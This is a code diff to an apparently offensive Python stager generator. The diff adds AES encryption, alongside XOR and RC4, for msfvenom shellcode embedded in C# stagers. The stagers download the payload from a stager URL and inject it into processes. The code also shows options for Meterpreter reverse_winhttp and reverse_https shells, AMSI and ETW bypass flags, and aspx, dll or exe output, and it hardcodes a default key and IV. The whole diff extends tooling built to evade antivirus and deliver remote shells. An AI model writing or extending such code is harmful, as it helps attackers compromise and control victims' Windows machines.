@@ -24,6 +24,8 @@ templates = {
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.IO;
 using System.Diagnostics;
 
 namespace {cs_namespace}
@@ -68,8 +70,6 @@ class Stager:
       print("Invalid msfvenom type")
       sys.exit(1)
 
-
-
     if args.format == "dll":
       self.compiled = True
       self.source_fn = self.args.output + ".cs"
@@ -113,6 +113,18 @@ class Stager:
     elif self.encrypt == 'rc4':
       print(f"Using RC4 key {RC4_KEY}")
       self.shellcode = ak.ShellCode(self.msfvenom_cmd, rc4_key=RC4_KEY)
+    elif self.encrypt == 'aes':
+      if self.args.key != "":
+        aes_key = self.args.key
+      else:
+        aes_key = "D(G+KbPeShVmYq3t"
+
+      if self.args.iv != "":
+        aes_iv = self.args.iv
+      else:
+        aes_iv = "8y/B?E(G+KbPeShV"
+      print(f"Using AES key {aes_key} and IV {aes_iv}")
+      self.shellcode = ak.ShellCode(self.msfvenom_cmd, aes_key=aes_key, aes_iv=aes_iv)
 
   def generate_stager_source(self):
     url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
@@ -137,6 +149,10 @@ class Stager:
     elif self.encrypt == 'rc4':
       imports += ak.RC4_DECRYPT_IMPORT
       main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
+    elif self.encrypt == 'aes':
+      imports += ak.AES_DECRYPT_IMPORT
+      main_code += ak.SC_AES_DECODER.format(enc_key=self.shellcode.key.decode('utf-8'),
+                                            enc_iv=self.shellcode.iv.decode('utf-8'))
     else:
       print("Invalid encryption format")
       sys.exit()
@@ -224,7 +240,9 @@ def main():
   parser.add_argument('--injection', '-i', default='earlybird', choices=ak.main_choices.keys())
   parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https'])
   parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx'])
-  parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4'])
+  parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4', 'aes'])
+  parser.add_argument('--key', default="", help="Key for AES or RC4")
+  parser.add_argument('--iv', default="", help="IV for AES")
   parser.add_argument('--heuristics', default=True, action='store_true')
   parser.add_argument('--amsi', default=False, action='store_true')
   parser.add_argument('--etw', default=True, action='store_true')
